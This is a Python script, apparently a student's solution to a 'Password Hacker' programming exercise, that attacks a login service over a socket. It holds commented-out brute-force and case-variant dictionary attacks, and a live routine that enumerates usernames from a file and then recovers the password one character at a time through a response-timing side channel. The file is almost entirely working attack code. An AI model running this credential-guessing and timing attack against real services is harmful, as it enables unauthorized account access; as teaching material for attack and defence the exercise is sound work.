import socket
import sys
import itertools
import string
import json
from datetime import datetime, timedelta

# Get list of arguments from cmd line

# SERVER = socket.gethostbyname(socket.gethostname())
# PORT = 5050
# ADDRESS = (SERVER, PORT)

host = sys.argv[1]
port = int(sys.argv[2])
# msg = sys.argv[3]

char_list = list(string.ascii_lowercase + string.digits)
char_list_task4 = list(string.ascii_letters + string.digits)
credentials = {
    "login": None,
    "password": ' '
}


# Password Generator
def password_gen():
    count = 1
    while True:
        if count <= 1000000:
            # word_list = itertools.combinations(char_list, count)
            word_list = itertools.product(char_list, repeat=count)
            for char in word_list:
                word = list(char)
                yield word
        else:
            break
        count += 1


# Bruteforce Method

# gen = password_gen()
#
# with socket.socket() as client_socket:  # Establish connection to host
#     address = (host, port)
#     client_socket.connect(address)
#
#     for _ in range(1000000):  # Bruteforce attack
#         msg = ""
#         msg = msg.join(next(gen))
#         msg = msg.encode('utf-8')
#         client_socket.send(msg)
#
#         response_msg = client_socket.recv(1024)
#         response_msg = response_msg.decode('utf-8')
#
#         if response_msg == "Connection success!":
#             print(msg.decode())
#             print("Pass")
#             break


# Dictionary Generator
def dictionary_gen(dt):
    low_char_list = list(dt.lower())
    upper_char_list = list(dt.upper())

    word_list = list(map(list, zip(low_char_list, upper_char_list)))
    # yield wt
    wl = itertools.product(*word_list)
    for char in wl:
        word = list(char)
        yield word


# Dictionary Method

# dictionary = list()
# with open('C:/Users/User/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt', 'rt') as file:
#     file = file.readlines()
#     for text in file:
#         dictionary.append(text.strip("\n"))  # Remove '\n'
#
# with socket.socket() as client_socket:  # Establish connection to host
#     address = (host, port)
#     client_socket.connect(address)
#
#     for line in dictionary:  # Dictionary attack
#         gen = dictionary_gen(line)
#         for obj_message in gen:
#             msg = ""
#             msg = msg.join(obj_message)
#             msg = msg.encode()
#             client_socket.send(msg)
#
#             response_msg = client_socket.recv(1024)
#             response_msg = response_msg.decode()
#
#             if response_msg == "Connection success!":  # Break inner loop
#                 print(msg.decode())
#                 break
#         if response_msg == "Connection success!":  # Break outer loop
#             break


# Character Generator
def char_gen():
    while True:
        # word_list = itertools.combinations(char_list, count)
        word_list = itertools.product(char_list_task4, repeat=1)
        for char in word_list:
            word = list(char)
            yield word


# Dictionary (login) & Bruteforce (password) Combination Method

with socket.socket() as client_socket:
    address = (host, port)
    client_socket.connect(address)

    login_dict = list()
    with open('C:/Users/User/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', 'rt') as file:
        file = file.readlines()
        for text in file:
            login_dict.append(text.strip("\n"))  # Remove '\n'

    for username in login_dict:
        credentials.update(login=username)
        json_str = json.dumps(credentials, indent=4)

        msg = json_str.encode('utf-8')
        client_socket.send(msg)

        response_msg = client_socket.recv(1024)
        response_msg = response_msg.decode('utf-8')

        if response_msg == '{"result": "Wrong password!"}':
            break

    gen = char_gen()
    passphrase = ""
    while True:  # Bruteforce attack
        temp = passphrase
        c = "".join(next(gen))
        temp += c
        credentials.update(password=temp)
        json_str = json.dumps(credentials, indent=4)

        msg = json_str.encode('utf-8')
        start = datetime.now()
        client_socket.send(msg)

        response_msg = client_socket.recv(1024)
        response_msg = response_msg.decode('utf-8')
        finish = datetime.now()
        time_diff = finish - start

        if time_diff > timedelta(milliseconds=10):
            passphrase += c
        if response_msg == '{"result": "Connection success!"}':
            print(json_str)
            break
